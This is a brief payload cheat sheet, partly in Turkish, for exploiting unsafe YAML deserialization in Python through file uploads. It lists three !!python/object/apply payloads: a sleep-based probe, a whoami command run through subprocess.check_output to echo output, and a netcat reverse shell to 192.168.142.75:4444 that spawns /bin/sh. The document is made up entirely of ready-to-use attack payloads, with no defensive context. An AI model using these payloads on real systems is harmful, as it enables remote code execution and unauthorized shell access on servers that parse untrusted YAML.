## yaml file upload


**sleep 20milis**

```bash
!!python/object/apply:time.sleep [20]
```

### Çıktıyı Responsede Görebilmek İçin (subprocess.check_output)


```bash
!!python/object/apply:subprocess.check_output [["whoami"]] 
```


### Reverse Shell


```bash
!!python/object/apply:subprocess.check_output
  args:
    - ['nc', '192.168.142.75', '4444', '-e', '/bin/sh']
```
